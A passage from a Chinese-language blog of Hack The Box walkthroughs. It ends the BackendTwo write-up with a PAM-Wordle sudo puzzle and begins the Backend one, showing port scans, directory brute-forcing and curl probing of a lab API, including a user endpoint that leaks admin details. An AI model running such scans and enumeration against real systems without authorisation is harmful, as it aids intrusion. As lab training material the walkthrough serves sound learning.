<br></code></pre></td></tr></table></figure><p>很好，现在我好像只用猜这些单词的顺序就可以了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">--- Attempt 1 of 6 ---<br>Word: write<br>Hint-&gt;?????<br>--- Attempt 2 of 6 ---<br>Word: close<br>Hint-&gt;*lo??<br>--- Attempt 3 of 6 ---<br>Word: <br><br></code></pre></td></tr></table></figure><p>lo是正确的，*表示c在错误的位置上，那么可以筛选一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">htb@BackendTwo:/opt$ <span class="hljs-built_in">cat</span> .words |grep l |grep o|grep c| grep -vE <span class="hljs-string">&#x27;(t|e)&#x27;</span><br>flock<br>mlock<br>locks<br>htb@BackendTwo:/opt$ <br></code></pre></td></tr></table></figure><p>筛选有l和o还要c但不包含T或e的单词。正确答案是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">htb@BackendTwo:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> htb: <br>--- Welcome to PAM-Wordle! ---<br><br>A five character [a-z] word has been selected.<br>You have 6 attempts to guess the word.<br><br>After each guess you will recieve a hint <span class="hljs-built_in">which</span> indicates:<br>? - what letters are wrong.<br>* - what letters are <span class="hljs-keyword">in</span> the wrong spot.<br>[a-z] - what letters are correct.<br><br>--- Attempt 1 of 6 ---<br>Word: write<br>Hint-&gt;?????<br>--- Attempt 2 of 6 ---<br>Word: close<br>Hint-&gt;*lo??<br>--- Attempt 3 of 6 ---<br>Word: flock<br>Hint-&gt;?lock<br>--- Attempt 4 of 6 ---<br>Word: mlock<br>Correct!<br>Matching Defaults entries <span class="hljs-keyword">for</span> htb on backendtwo:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User htb may run the following commands on backendtwo:<br>    (ALL : ALL) ALL<br>htb@BackendTwo:~$ <br></code></pre></td></tr></table></figure><p>可以sudo所有.</p>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Backend</title>
    <link href="/post/HackTheBox-Backend.html"/>
    <url>/post/HackTheBox-Backend.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Backend.png" alt="Backend"></p><h6 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.11.161<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-27 10:30:15 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 22/tcp on 10.10.11.161                                    <br>Discovered open port 80/tcp on 10.10.11.161   <br>Crazy:~/HackTheBox$ sudo nmap -sC -sV 10.10.11.161 -p80                              <br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-27 18:32 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.161<br>Host is up (0.11s latency).<br><br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    uvicorn<br>|_http-server-header: uvicorn<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (application/json).</span><br><span class="hljs-string">| fingerprint-strings: </span><br><span class="hljs-string">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: </span><br><span class="hljs-string">|     HTTP/1.1 400 Bad Request</span><br><span class="hljs-string">|     content-type: text/plain; charset=utf-8</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     Invalid HTTP request received.</span><br><span class="hljs-string">|   FourOhFourRequest: </span><br><span class="hljs-string">|     HTTP/1.1 404 Not Found</span><br><span class="hljs-string">|     date: Sat, 27 Aug 2022 14:43:52 GMT</span><br><span class="hljs-string">|     server: uvicorn</span><br><span class="hljs-string">|     content-length: 22</span><br><span class="hljs-string">|     content-type: application/json</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &#123;&quot;detail&quot;:&quot;Not Found&quot;&#125;</span><br><span class="hljs-string">|   GetRequest: </span><br><span class="hljs-string">|     HTTP/1.1 200 OK</span><br><span class="hljs-string">|     date: Sat, 27 Aug 2022 14:43:40 GMT</span><br><span class="hljs-string">|     server: uvicorn</span><br><span class="hljs-string">|     content-length: 29</span><br><span class="hljs-string">|     content-type: application/json</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &#123;&quot;msg&quot;:&quot;UHC API Version 1.0&quot;&#125;</span><br><span class="hljs-string">|   HTTPOptions: </span><br><span class="hljs-string">|     HTTP/1.1 405 Method Not Allowed</span><br><span class="hljs-string">|     date: Sat, 27 Aug 2022 14:43:46 GMT</span><br><span class="hljs-string">|     server: uvicorn</span><br><span class="hljs-string">|     content-length: 31</span><br><span class="hljs-string">|     content-type: application/json</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|_    &#123;&quot;detail&quot;:&quot;Method Not Allowed&quot;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 69.88 seconds</span><br><span class="hljs-string">zsh: segmentation fault  sudo nmap -sC -sV 10.10.11.161 -p80</span><br></code></pre></td></tr></table></figure><p>不熟。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ dirsearch -u http://backend.htb/ <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/crazyinside/.dirsearch/reports/backend.htb/-_22-08-27_18-35-34.txt<br><br>Error Log: /home/crazyinside/.dirsearch/logs/errors-22-08-27_18-35-34.<span class="hljs-built_in">log</span><br><br>Target: http://backend.htb/<br><br>[18:35:35] Starting: <br>[18:36:19] 200 -   20B  - /api<br>[18:36:19] 200 -   30B  - /api/v1<br>[18:36:19] 307 -    0B  - /api/  -&gt;  http://backend.htb/api<br>[18:36:36] 401 -   30B  - /docs<br>[18:36:36] 307 -    0B  - /docs/  -&gt;  http://backend.htb/docs<br><br>Task Completed<br>                                                                                                                                       <br>Crazy:~/HackTheBox$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -I http://backend.htb/api                                                                          <br>HTTP/1.1 405 Method Not Allowed<br><span class="hljs-built_in">date</span>: Sat, 27 Aug 2022 14:47:38 GMT<br>server: uvicorn<br>content-length: 31<br>content-type: application/json<br><br>                                                                                                                                        <br>Crazy:~/HackTheBox$ curl -I http://backend.htb/api -X POST<br>HTTP/1.1 405 Method Not Allowed<br><span class="hljs-built_in">date</span>: Sat, 27 Aug 2022 14:47:47 GMT<br>server: uvicorn<br>content-length: 31<br>content-type: application/json<br><br>                                                                                                                                        <br>Crazy:~/HackTheBox$ curl -I http://backend.htb/api -X HEAD<br>HTTP/1.1 405 Method Not Allowed<br><span class="hljs-built_in">date</span>: Sat, 27 Aug 2022 14:47:53 GMT<br>server: uvicorn<br>content-length: 31<br>content-type: application/json<br><br>                                                                                                                                        <br>Crazy:~/HackTheBox$ curl -I http://backend.htb/api -X GET <br>HTTP/1.1 200 OK<br><span class="hljs-built_in">date</span>: Sat, 27 Aug 2022 14:47:57 GMT<br>server: uvicorn<br>content-length: 20<br>content-type: application/json<br><br>                                                                                                                                        <br>Crazy:~/HackTheBox$ curl http://backend.htb/api        <br>&#123;<span class="hljs-string">&quot;endpoints&quot;</span>:[<span class="hljs-string">&quot;v1&quot;</span>]&#125;                                                                                                                                        <br>Crazy:~/HackTheBox$ curl http://backend.htb/docs<br>&#123;<span class="hljs-string">&quot;detail&quot;</span>:<span class="hljs-string">&quot;Not authenticated&quot;</span>&#125;                                                                                                                                        <br>Crazy:~/HackTheBox$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl http://backend.htb/api/v1<br>&#123;<span class="hljs-string">&quot;endpoints&quot;</span>:[<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>]&#125;                                                                                                                                        <br>Crazy:~/HackTheBox$ curl http://backend.htb/api/v1/user<br>&#123;<span class="hljs-string">&quot;detail&quot;</span>:<span class="hljs-string">&quot;Not Found&quot;</span>&#125;                                                                                                                                        <br>Crazy:~/HackTheBox$ curl http://backend.htb/api/v1/admin<br>                                                                                                                                        <br>Crazy:~/HackTheBox$ curl http://backend.htb/api/v1/admin -I<br>HTTP/1.1 307 Temporary Redirect<br><span class="hljs-built_in">date</span>: Sat, 27 Aug 2022 14:50:59 GMT<br>server: uvicorn<br>location: http://backend.htb/api/v1/admin/<br>Transfer-Encoding: chunked<br><br>                                                                                                                                        <br>Crazy:~/HackTheBox$ <br></code></pre></td></tr></table></figure><p>说不定admin下会有什么东西：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ feroxbuster -u http://backend.htb/api/v1/admin -e                              <br><br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.7.0<br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http://backend.htb/api/v1/admin<br> 🚀  Threads               │ 50<br> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<br> 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]<br> 💥  Timeout (secs)        │ 7<br> 🦡  User-Agent            │ feroxbuster/2.7.0<br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 🔎  Extract Links         │ <span class="hljs-literal">true</span><br> 🏁  HTTP methods          │ [GET]<br> 🔃  Recursion Depth       │ 4<br> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest<br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br>307      GET        0l        0w        0c http://backend.htb/api/v1/admin =&gt; http://backend.htb/api/v1/admin/<br>405      GET        1l        3w       31c http://backend.htb/api/v1/admin/file<br>[<span class="hljs-comment">####################] - 2m     30000/30000   0s      found:2       errors:0      </span><br>[<span class="hljs-comment">####################] - 2m     30000/30000   229/s   http://backend.htb/api/v1/admin </span><br></code></pre></td></tr></table></figure><p>有，但暂时没什么用。用户目录下有很多：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ feroxbuster -u http://backend.htb/api/v1/user -e <br><br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.7.0<br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http://backend.htb/api/v1/user<br> 🚀  Threads               │ 50<br> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<br> 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]<br> 💥  Timeout (secs)        │ 7<br> 🦡  User-Agent            │ feroxbuster/2.7.0<br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 🔎  Extract Links         │ <span class="hljs-literal">true</span><br> 🏁  HTTP methods          │ [GET]<br> 🔃  Recursion Depth       │ 4<br> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest<br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br>200      GET        1l        1w        4c http://backend.htb/api/v1/user/2010<br>200      GET        1l        1w        4c http://backend.htb/api/v1/user/404<br>200      GET        1l        1w        4c http://backend.htb/api/v1/user/2009<br>200      GET        1l        1w        4c http://backend.htb/api/v1/user/2011<br>200      GET        1l        1w        4c http://backend.htb/api/v1/user/2008<br>200      GET        1l        1w        4c http://backend.htb/api/v1/user/2007<br>200      GET        1l        1w      141c http://backend.htb/api/v1/user/1<br>200      GET        1l        1w        4c http://backend.htb/api/v1/user/9<br>...............................<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl http://backend.htb/api/v1/user/1  <br>&#123;<span class="hljs-string">&quot;guid&quot;</span>:<span class="hljs-string">&quot;36c2e94a-4271-4259-93bf-c96ad5948284&quot;</span>,<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;admin@htb.local&quot;</span>,<span class="hljs-string">&quot;date&quot;</span>:null,<span class="hljs-string">&quot;time_created&quot;</span>:1649533388111,<span class="hljs-string">&quot;is_superuser&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;id&quot;</span>:1&#125; <br></code></pre></td></tr></table></figure><p>敏感信息泄露。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl http://backend.htb/api/v1/user/2007<br>null     <br></code></pre></td></tr></table></figure><p>可以快速生成一个1-10000的数字列表，而且似乎没必要考虑01,001等：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl http://10.10.11.161/api/v1/user/01                                                                 <br>&#123;<span class="hljs-string">&quot;guid&quot;</span>:<span class="hljs-string">&quot;36c2e94a-4271-4259-93bf-c96ad5948284&quot;</span>,<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;admin@htb.local&quot;</span>,<span class="hljs-string">&quot;date&quot;</span>:null,<span class="hljs-string">&quot;time_created&quot;</span>:1649533388111,<span class="hljs-string">&quot;is_superuser&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;id&quot;</span>:1&#125;                                                                                                                                                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.161/api/v1/user/1 <br>&#123;<span class="hljs-string">&quot;guid&quot;</span>:<span class="hljs-string">&quot;36c2e94a-4271-4259-93bf-c96ad5948284&quot;</span>,<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;admin@htb.local&quot;</span>,<span class="hljs-string">&quot;date&quot;</span>:null,<span class="hljs-string">&quot;time_created&quot;</span>:1649533388111,<span class="hljs-string">&quot;is_superuser&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;id&quot;</span>:1&#125;                                                                                                                                                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.161/api/v1/user/001<br>&#123;<span class="hljs-string">&quot;guid&quot;</span>:<span class="hljs-string">&quot;36c2e94a-4271-4259-93bf-c96ad5948284&quot;</span>,<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;admin@htb.local&quot;</span>,<span class="hljs-string">&quot;date&quot;</span>:null,<span class="hljs-string">&quot;time_created&quot;</span>:1649533388111,<span class="hljs-string">&quot;is_superuser&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;id&quot;</span>:1&#125;                                                                                                                                                                                                                                                                                 <br>Crazy:~/HackTheBox$ curl http://10.10.11.161/api/v1/user/0001<br>&#123;<span class="hljs-string">&quot;guid&quot;</span>:<span class="hljs-string">&quot;36c2e94a-4271-4259-93bf-c96ad5948284&quot;</span>,<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;admin@htb.local&quot;</span>,<span class="hljs-string">&quot;date&quot;</span>:null,<span class="hljs-string">&quot;time_created&quot;</span>:1649533388111,<span class="hljs-string">&quot;is_superuser&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;id&quot;</span>:1&#125; <br></code></pre></td></tr></table></figure><p>没跑出来啥。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ feroxbuster -u http://backend.htb/api/v1/user -e -m GET,POST -C 404,405,422<br>422     POST        1l        3w      172c http://10.10.11.161/api/v1/user/login<br>200      GET        1l        1w      141c http://10.10.11.161/api/v1/user/1<br>200      GET        1l        1w      144c http://10.10.11.161/api/v1/user/2<br>200      GET        1l        1w      139c http://10.10.11.161/api/v1/user/3<br>422     POST        1l        2w       81c http://10.10.11.161/api/v1/user/signup  <br>200      GET        1l        1w      139c http://10.10.11.161/api/v1/user/03<br>200      GET        1l        1w      141c http://10.10.11.161/api/v1/user/01       <br>200      GET        1l        1w      144c http://10.10.11.161/api/v1/user/02      <br>200      GET        1l        1w      141c http://10.10.11.161/api/v1/user/001     <br>200      GET        1l        1w      144c http://10.10.11.161/api/v1/user/002<br>200      GET        1l        1w      141c http://10.10.11.161/api/v1/user/0001<br>200      GET        1l        1w      139c http://10.10.11.161/api/v1/user/003<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl http://10.10.11.161/api/v1/user/signup -X POST -s | jq .<br>&#123;<br>  <span class="hljs-string">&quot;detail&quot;</span>: [<br>    &#123;<br>      <span class="hljs-string">&quot;loc&quot;</span>: [<br>        <span class="hljs-string">&quot;body&quot;</span><br>      ],<br>      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;field required&quot;</span>,<br>      <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;value_error.missing&quot;</span><br>    &#125;<br>  ]<br>&#125;               <br></code></pre></td></tr></table></figure><p>必填字段值为空。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -s -X POST -d <span class="hljs-string">&quot;Crazy&quot;</span> http://10.10.11.161/api/v1/user/signup -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> | jq .<br>&#123;<br>  <span class="hljs-string">&quot;detail&quot;</span>: [<br>    &#123;<br>      <span class="hljs-string">&quot;loc&quot;</span>: [<br>        <span class="hljs-string">&quot;body&quot;</span>,<br>        0<br>      ],<br>      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;Expecting value: line 1 column 1 (char 0)&quot;</span>,<br>      <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;value_error.jsondecode&quot;</span>,<br>      <span class="hljs-string">&quot;ctx&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;Expecting value&quot;</span>,<br>        <span class="hljs-string">&quot;doc&quot;</span>: <span class="hljs-string">&quot;Crazy&quot;</span>,<br>        <span class="hljs-string">&quot;pos&quot;</span>: 0,<br>        <span class="hljs-string">&quot;lineno&quot;</span>: 1,<br>        <span class="hljs-string">&quot;colno&quot;</span>: 1<br>      &#125;<br>    &#125;<br>  ]<br>&#125;<br>                                                                                                                                                                                                                                                                                 <br>Crazy:~/HackTheBox$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -s -X POST -d <span class="hljs-string">&#x27;&#123;&quot;Crazy&quot;:&quot;password&quot;&#125;&#x27;</span> http://10.10.11.161/api/v1/user/signup -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> | jq .<br>&#123;<br>  <span class="hljs-string">&quot;detail&quot;</span>: [<br>    &#123;<br>      <span class="hljs-string">&quot;loc&quot;</span>: [<br>        <span class="hljs-string">&quot;body&quot;</span>,<br>        <span class="hljs-string">&quot;email&quot;</span><br>      ],<br>      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;field required&quot;</span>,<br>      <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;value_error.missing&quot;</span><br>    &#125;,<br>    &#123;<br>      <span class="hljs-string">&quot;loc&quot;</span>: [<br>        <span class="hljs-string">&quot;body&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span><br>      ],<br>      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;field required&quot;</span>,<br>      <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;value_error.missing&quot;</span><br>    &#125;<br>  ]<br>&#125;<br>                                                                                                                                                                                                                                                                                 <br>Crazy:~/HackTheBox$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -s -X POST -d <span class="hljs-string">&#x27;&#123;&quot;email&quot;:&quot;crazy@inside.htb&quot;,&quot;password&quot;:&quot;PassWord1&quot;&#125;&#x27;</span> http://10.10.11.161/api/v1/user/signup -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> | jq .<br>&#123;&#125;<br></code></pre></td></tr></table></figure><p>返回为空了，或许不再是json格式了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -s -X POST -d <span class="hljs-string">&#x27;&#123;&quot;email&quot;:&quot;crazy@inside.htb&quot;,&quot;password&quot;:&quot;PassWord1&quot;&#125;&#x27;</span> http://10.10.11.161/api/v1/user/signup -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span>       <br>&#123;<span class="hljs-string">&quot;detail&quot;</span>:<span class="hljs-string">&quot;The user with this username already exists in the system&quot;</span>&#125;  <br></code></pre></td></tr></table></figure><p>好像注册成功了，既然有注册应该有登录的吧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 